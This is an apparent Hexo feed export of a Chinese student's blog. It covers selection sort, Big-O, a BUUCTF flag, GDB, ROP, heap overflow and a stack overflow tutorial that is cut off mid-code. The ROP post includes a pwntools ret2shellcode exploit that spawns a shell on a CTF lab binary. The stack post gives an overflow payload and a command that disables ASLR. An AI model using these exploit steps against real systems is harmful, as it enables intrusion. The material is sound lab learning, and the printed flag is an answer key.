class="number">8</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">9</span>&#125;;<span class="comment">//对这个数组进行排序</span></span><br><span class="line"><span class="comment">//printf(&quot;%d&quot;,sizeof(arr));</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(arr); i++) </span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> Min_Pro = i;<span class="comment">//用来表示循环的时候的最小值的位置</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = i + <span class="number">1</span>; j &lt; <span class="keyword">sizeof</span>(arr); j++) </span><br><span class="line">&#123;<span class="comment">//这个for是用来循环判断是否比后面那个小,如果小的话就把Min_Pro的值改成对应的地方的值</span></span><br><span class="line"><span class="keyword">if</span> (arr[j] &lt; arr[Min_Pro]) </span><br><span class="line">&#123;</span><br><span class="line">Min_Pro = j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> temp = arr[i];</span><br><span class="line">arr[i] = arr[Min_Pro];</span><br><span class="line">arr[Min_Pro] = temp;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, arr[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="选择排序的big-O分析"><a href="#选择排序的big-O分析" class="headerlink" title="选择排序的big O分析"></a>选择排序的big O分析</h1>]]></content>
      
      
      <categories>
          
          <category> 十大排序 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>算法基本概念</title>
      <link href="/2023/05/30/%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%A5%E9%97%A8%E7%AF%87-1-%E7%AE%97%E6%B3%95%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/"/>
      <url>/2023/05/30/%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%A5%E9%97%A8%E7%AF%87-1-%E7%AE%97%E6%B3%95%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</url>
      
        <content type="html"><![CDATA[<p>什么是数据结构？</p><ul><li>Data Structure</li><li>存储数据的不同方式<ul><li>就是数据结构</li></ul></li></ul><p>什么是算法？</p><ul><li>同一个问题不同的解决方法</li><li>算法往往是针对特定数据结构的</li></ul><hr><p> 在进行算法的时候</p><p>需要选定特定的数据结构，不同的数据结构有各自的优缺点</p><hr><p>算法的优势，缺点</p><ul><li>时间测算<ul><li>计算算法时间差</li><li>幅度不够循环来凑【循环某个算法，扩大使用时间来判断时间差】</li></ul></li><li>空间测算</li></ul><hr><p>Big O</p><ul><li> 用于描述算法的复杂程度</li><li>忽略低次项</li><li>时间复杂度<ul><li>规模的扩大n，时间的变化规律【和函数差不多】<ul><li>O(1);O(n)</li></ul></li><li>求一个数组的平均数<ul><li>O(n)</li></ul></li></ul></li><li>空间复杂度</li></ul><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20230530230656810.png" alt="image-20230530230656810"></p>]]></content>
      
      
      <categories>
          
          <category> 十大排序 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF2020 JustRE (13)</title>
      <link href="/2023/05/30/Re%E5%88%B7%E9%A2%98%E5%92%AF-13-BJDCTF2020-JustRE/"/>
      <url>/2023/05/30/Re%E5%88%B7%E9%A2%98%E5%92%AF-13-BJDCTF2020-JustRE/</url>
      
        <content type="html"><![CDATA[<p>首先是下载附件</p><p>然后打开看到是32位的文件</p><p>然后用IDA打开看看</p><p>进去看到有main函数，但是没有啥思路</p><p>用shift+f12看看字符串</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230601001356801.png" alt="image-20230601001356801"></p><p>通过强大的眼里看到这个地方，点过去看看</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230530214307590.png" alt="image-20230530214307590"></p><p>这里就考察了一个sprintf函数没了…</p><p>flag{1999902069a45792d233ac}</p>]]></content>
      
      
      <categories>
          
          <category> BUU-Re题目 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux-GDB动态调试</title>
      <link href="/2023/05/30/kali%E5%B7%A5%E5%85%B7-%E5%91%BD%E4%BB%A4-%E5%A4%A7%E6%9D%82%E7%83%A9-2-GDB%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%A5%9E%E5%99%A8/"/>
      <url>/2023/05/30/kali%E5%B7%A5%E5%85%B7-%E5%91%BD%E4%BB%A4-%E5%A4%A7%E6%9D%82%E7%83%A9-2-GDB%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%A5%9E%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p>1.在自己写的程序需要用GDB的时候</p><p>需要用-g 来编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc test.c -g -o test</span><br></pre></td></tr></table></figure><p>2.</p>]]></content>
      
      
      <categories>
          
          <category> kali工具/命令大杂烩 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ROP编程（36）</title>
      <link href="/2023/05/30/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-36-ROP%E7%BC%96%E7%A8%8B/"/>
      <url>/2023/05/30/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-36-ROP%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="ROP编程"><a href="#ROP编程" class="headerlink" title="ROP编程"></a>ROP编程</h1><h2 id="什么是ROP？"><a href="#什么是ROP？" class="headerlink" title="什么是ROP？"></a>什么是ROP？</h2><p>ROP是一种–返回导向编程，这是一种高级的内存攻击技术，可以用来进行绕过。绕过一些防御，比如：内存不可执行和代码签名。</p><p>栈溢出的特点是ret处，那么ROP的核心思想就是利用ret结尾指令序列吧栈中应该返回EIP的地址改成我们需要的值，从而控制程序的执行流程</p><p>ROP是一种绕过开启了NX一种办法。NX是：不可执行的意思。</p><h3 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h3><p>原理：将数据所在内存页标志为不可执行，当程序溢出成功转入shellcode的时候，程序会尝试在数据页面上执行指令，这个时候CPU就会抛出异常，而不是去执行恶心代码。</p><p>当NX开启的时候，往栈上或者堆上注入代码的方法难以发挥效果。</p><p>这个时候就可以用ROP来进行绕过。</p><h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p>思想：在栈缓冲区溢出的基础上，利用程序中已有小片段【gadgets】来改变某些<strong>寄存器</strong>或者<strong>变量</strong>的值，从而控制程序的执行流程。</p><ul><li><p>gadgets</p><ul><li>就是以ret结尾的指令序列。</li><li>通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行顺序</li></ul></li><li><p>核心在于</p><ul><li>利用指令集中的ret指令，改变了指令流的执行顺序</li></ul></li></ul><ul><li><p>条件</p><ul><li>程序存在溢出，并且可以控制返回地址</li><li>可以找到满足条件的gadgets以及gadgets的地址</li><li>如果gadgets每次的地址是不固定的，那么就需要想办法来动态获取对应的地址了</li></ul></li><li><p>​    基本的ROP</p><ul><li>ret2text</li><li>ret2shellcode</li><li>ret2syscall</li><li>ret2libc</li><li>..</li></ul></li></ul><h2 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h2><p>题目链接：</p><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example</a></p><p>下载下来：首先运行来看看</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230530181126453.png" alt="image-20230530181126453"></p><p>可以用checksec ret2shellcode</p><p>来看看它开保护没有</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230530181557880.png" alt="image-20230530181557880"></p><p>很明显啥保护都没，铁定溢出</p><p>他说：No system for you this time !!!</p><p>没有system – 也就是没有后门</p><p>这里保持不信的态度，用IDA看看</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230530181301742.png" alt="image-20230530181301742"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No system for you this time !!!&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, s, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;bye bye ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入眼前的就是gets 和 puts 函数，这俩个实在是太容易溢出了</p><p>strncpy 把s中的100个字符copy到buf2中</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230530181941629.png" alt="image-20230530181941629"></p><p>点过去看到这个buf2是放在bss段中</p><h3 id="bss段"><a href="#bss段" class="headerlink" title="bss段"></a>bss段</h3><ul><li>通常是指用来存放程序中未初始化的全局变量的一块内存区域</li><li>bss段属于静态内存分配</li></ul><p>这里动态调试一下，看看bss段是否可以执行</p><ul><li>涨知识了，数据段还可以执行</li></ul><p>看到这个buf2的地址：0804A080</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230530182827999.png" alt="image-20230530182827999"></p><p>通过vmmp这个指令</p><p>0x08049f08 0x0804a0e4 rw-p</p><p>发现这个是可以写的</p><p>0804858</p><p>首先我们将payload输入到变量s也就是栈上，然后将main函数的返回地址覆盖为buf2_addr（此bss段可执行），之后main函数执行strncpy(buf2, &amp;s, 100u);（虽然shellcode被截断为100，但是被截断的内容只是A，并不影响shellcode的完整度），将内容复制到了buf2，由于main函数的返回地址被覆盖为shellcode的地址，因此在main函数执行完毕之后，EIP转向执行shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh()) <span class="comment">#生成并汇编shellcode</span></span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">b&#x27;A&#x27;</span>) + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>主要还是要以后慢慢琢磨</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>堆溢出（35）</title>
      <link href="/2023/05/29/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-35-%E5%A0%86%E6%BA%A2%E5%87%BA/"/>
      <url>/2023/05/29/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-35-%E5%A0%86%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="堆溢出的原理"><a href="#堆溢出的原理" class="headerlink" title="堆溢出的原理"></a>堆溢出的原理</h1><p>堆溢出，本质上和栈溢出我感觉差不多。【缓冲区溢出的一种】</p><p>主要就是写入的字节的数目，超过了声请的空间。倒置覆盖掉物理相邻的高地址的下一个堆块。</p><p>前提</p><ul><li>要有数据的写入（gets()）</li><li>写入的数据没有良好的被控制</li></ul><p>对于攻击者来说：堆溢出可以程序崩溃也可以控制程序的执行</p><p>但是堆溢出无法控制EIP所以</p><p>利用的方法有</p><ol><li>覆盖与之相邻的下一个chunk的内容<ul><li>prev_size</li><li>size,主要有三个比特位，以及该堆块真正的大小<ul><li>NON_MAIN_ARENA</li><li>IS_MAPPED</li><li>PREV_INUSE</li><li>the True chunk size</li></ul></li><li>chunk content，从而改变程序固有的执行流。</li></ul></li></ol><p>​    2.利用堆中的机制（如unlink）来实现任意地址写入（Write-Anything-Anywhere）或控制堆块中的内容等效果，从而来控制程序的执行流</p><h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *chunk;</span><br><span class="line">    chunk=<span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Get input:&quot;</span>);</span><br><span class="line">    gets(chunk);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个程序的主要目的是调用malloc()函数分配一块堆上的内容，然后向这个堆块中写入一个字符串，如果输入的字符串过长就会导致溢出chunk的区域并覆盖后面的top chunk之中（实际puts内部会调用malloc 分配堆内存，覆盖的可能并不是top chunk）</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230529213957962.png" alt="image-20230529213957962"></p><h1 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h1><h2 id="1-寻找堆分配函数"><a href="#1-寻找堆分配函数" class="headerlink" title="1.寻找堆分配函数"></a>1.寻找堆分配函数</h2><ul><li>glibc中的malloc()函数</li><li>calloc()：这个函数和malloc的区别是：在分配后会自动进行清空，这个对于<strong>信息泄露的利用来说是很牛的</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">calloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="comment">//等同于</span></span><br><span class="line">ptr = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">memset</span>(ptr,<span class="number">0</span>,<span class="number">0x20</span>);</span><br></pre></td></tr></table></figure><ul><li>realloc()：这个函数身兼malloc和free两个函数的功能</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> *chunk,*chunk1;</span><br><span class="line">    chunk = <span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    chunk1 = <span class="built_in">realloc</span>(chunk,<span class="number">32</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>realloc 的操作：</p><ul><li>当realloc(ptr,size) 的 size 不等于 ptr 的 size 时<ul><li>如果size &gt; 原来的size<ul><li>如果 chunk 与 top chunk 相邻，直接扩展这个 chunk 到新 size 大小</li><li>如果 chunk 与 top chunk 不相邻，相当于 free(ptr),malloc(new_size)</li></ul></li><li>如果size &lt; 原来的size<ul><li>如果相差不足以容得下一个最小 chunk(64 位下 32 个字节，32 位下 16 个字节)，则保持不变</li><li>如果相差可以容得下一个最小 chunk，则切割原 chunk 为两部分，free 掉后一部分</li></ul></li></ul></li><li>当 realloc(ptr,size) 的 size 等于 0 时，相当于 free(ptr)</li><li>当 realloc(ptr,size) 的 size 等于 ptr 的 size，不进行任何操作</li></ul><h2 id="2-寻找危险函数"><a href="#2-寻找危险函数" class="headerlink" title="2.寻找危险函数"></a>2.寻找危险函数</h2><ul><li>输入<ul><li>gets，直接读取一行，忽略 ‘\x00’</li><li>scanf</li><li>vscanf</li></ul></li><li>输出<ul><li>sprintf</li></ul></li><li>字符串<ul><li>strcpy，字符串复制，遇到 ‘\x00’ 停止</li><li>strcat，字符串拼接，遇到 ‘\x00’ 停止</li><li>bcopy</li></ul></li></ul><h2 id="3-确定需要填充的长度"><a href="#3-确定需要填充的长度" class="headerlink" title="3.确定需要填充的长度"></a>3.确定需要填充的长度</h2><p>主要就是计算：我们开始写入的地址和我们所需要覆盖的掉的地址之间的距离。</p><p>有一个<strong>误区</strong>：malloc的参数等于实际分配堆块的大小，但是事实上 ptmalloc 分配出来的大小是对齐的。这个长度一般是字长的 2 倍，比如 32 位系统是 8 个字节，64 位系统是 16 个字节。但是对于不大于 2 倍字长的请求，malloc 会直接返回 2 倍字长的块也就是最小 chunk，比如 64 位系统执行malloc(0)会返回用户区域为16 字节的块。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *chunk;</span><br><span class="line">    chunk=<span class="built_in">malloc</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Get input:&quot;</span>);</span><br><span class="line">    gets(chunk);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//根据系统的位数，malloc会分配8或16字节的用户空间</span></span><br></pre></td></tr></table></figure><p>注意用户区域的大小<strong>不等于 chunk_head.size</strong>，chunk_head.size = 用户区域大小 + 2 * 字长</p><p>还有一点是用户申请的内存大小会被修改，其有可能会使用与其物理相邻的下一个 chunk 的prev_size 字段储存内容。回头再来看下之前的示例代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *chunk;</span><br><span class="line">    chunk=<span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Get input:&quot;</span>);</span><br><span class="line">    gets(chunk);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>观察如上代码，我们申请的 chunk 大小是 24 个字节。但是我们将其编译为 64 位可执行程序时，实际上分配的内存会是 <strong>16 个字节</strong>而不是 24 个。</p><p>16 个字节的空间是如何装得下 24 个字节的内容呢？答案是借用了下一个块的 pre_size 域。我们可来看一下用户申请的内存大小与 glibc 中实际分配的内存大小之间的转换。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req) \</span></span><br><span class="line"><span class="meta">(((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE) \</span></span><br><span class="line"><span class="meta">? MINSIZE \</span></span><br><span class="line"><span class="meta">: ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br></pre></td></tr></table></figure><p>当 req=24 时，request2size(24)=32。而除去 chunk 头部的 16 个字节。实际上用户可用 chunk 的字节数为 16。而根据我们前面学到的知识可以知道 chunk 的 pre_size 仅当它的前一块处于释放状态时才起作用。所以用户这时候其实还可以使用下一个 chunk 的 prev_size 字段，正好 24 个字节。</p><p><strong>实际上ptmalloc分配内存是以双字为基本单位，以 64 位系统为例，分配出来的空间是 16 的整数倍，即用户申请的 chunk 都是 16字节对齐的。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>栈溢出实战（34）</title>
      <link href="/2023/05/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-34-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AE%9E%E6%88%98/"/>
      <url>/2023/05/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-34-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<h1 id="栈溢出原理"><a href="#栈溢出原理" class="headerlink" title="栈溢出原理"></a>栈溢出原理</h1><p>由于C语言对数组引用不做任何边界检查 ，从而导致缓冲区溢出。</p><p>栈没有保护，指针可以通过传入的参数的大小，一直基于基地址往上指。</p><p>缓冲区溢出：</p><ul><li>栈溢出<ul><li>栈上保存着局部变量和一些状态信息（寄存器值，返回地址…）</li><li>发生了溢出就可以做到随意的该这些状态信息。并且攻击者可以通过覆写返回地址来执行代码，利用方法包括shellcode注入，ret2text，ret2libc ，ROP…</li></ul></li><li>堆溢出</li></ul><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><ul><li>首先你得能在栈上写数据</li><li>写入的数据大小没有被检测或者未被检测到</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">success</span><span class="params">()</span> &#123; <span class="built_in">puts</span>(<span class="string">&quot;You Hava already controlled it.&quot;</span>); &#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">char</span> s[<span class="number">12</span>];</span><br><span class="line">gets(s);</span><br><span class="line"><span class="built_in">puts</span>(s);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">vulnerable();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gcc 编译指令中，-m32 指的是生成 32 位程序； -fno-stack-protector 指的是不开启堆栈溢出保护，即不生成 canary。 此外，为了更加方便地介绍栈溢出的基本利用方式，这里还需要关闭 PIE（PositionIndependent Executable），避免加载基址被打乱。不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令gcc -v查看 gcc 默认的开关情况。如果含有–enable-default-pie参数则代表 PIE 默认已开启，</p><p>需要在编译指令中添加参数-no-pie。通过漏洞达到执行success函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector test.c</span><br></pre></td></tr></table></figure><p>提到编译时的 PIE 保护，Linux 平台下还有地址空间分布随机化（ASLR）的机制。简单来说即使可执行文件开启了 PIE 保护，还需要系统开启 ASLR 才会真正打乱基址，否则程序运行时依旧会在加载一个固定的基址上（不过和 No PIE 时基址不同）。我们可以通过修改 /proc/sys/kernel/randomize_va_space来控制 ASLR 启动与否，具体的选项有</p><ul><li><p>0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。</p></li><li><p>1，普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化。</p></li><li><p>2，增强的 ASLR，在 1 的基础上，增加了堆基地址随机化。</p></li></ul><p>我们可以使用echo 0 &gt; /proc/sys/kernel/randomize_va_space关闭 Linux 系统的 ASLR，类似的，也可以配置相应的参数。</p><p>为了降低后续漏洞利用复杂度，我们这里关闭 ASLR，在编译时关闭 PIE。当然读者也可以尝试 ASLR、PIE 开关的不同组合，配合 IDA 及其动态调试功能观察程序地址变化情况（在 ASLR 关闭、PIE 开启时也可以攻击成功）</p><p>可以用checksec 来检测一下</p><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20230529000258749.png" alt="image-20230529000258749"></p><p>我们用IDA来看看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vulnerable</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> s; <span class="comment">// [sp+4h] [bp-14h]@1</span></span><br><span class="line">gets(&amp;s);</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现这个ebp的长度是0x14；</p><p>这里bp的长度是0x20</p><p>那么栈的结果就是：</p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20230528235448813.png" alt="image-20230528235448813" style="zoom:50%;" /><p>并且，我们可以通过 IDA 获得 success 的地址，其地址为 0x0804843B。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:0804843B success proc near</span><br><span class="line">.text:0804843B push ebp</span><br><span class="line">.text:0804843C mov ebp, esp</span><br><span class="line">.text:0804843E sub esp, 8</span><br><span class="line">.text:08048441 sub esp, 0Ch</span><br><span class="line">.text:08048444 push offset s ; &quot;You Hava alreadycontrolled it.&quot;</span><br><span class="line">.text:08048449 call _puts</span><br><span class="line">.text:0804844E add esp, 10h</span><br><span class="line">.text:08048451 nop</span><br><span class="line">.text:08048452 leave</span><br><span class="line">.text:08048453 retn</span><br><span class="line">.text:08048453 success endp</span><br></pre></td></tr></table></figure><p>那么如果我们读取的字符串为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x14</span>*<span class="string">&#x27;a&#x27;</span>+<span class="string">&#x27;bbbb&#x27;</span>+success_addr</span><br></pre></td></tr></table></figure><p>那么，由于 gets 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 saved ebp 覆盖为 bbbb，将 retaddr 覆盖为 success_addr，即，此时的栈结构为</p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20230528235535625.png" alt="image-20230528235535625" style="zoom:50%;" /><p>但是需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即 0x0804843B 在内存中的形式是 \x3b\x84\x04\x08</p><p>但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候 \，x 等也算一个单独的字符。。所以我们需要想办法将 \x3b 作为一个字符输入进去。那么此时我们就需要使用一波 pwntools 了(关于如何安装以及基本用法，请自行 github)，这里利用 pwntools 的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 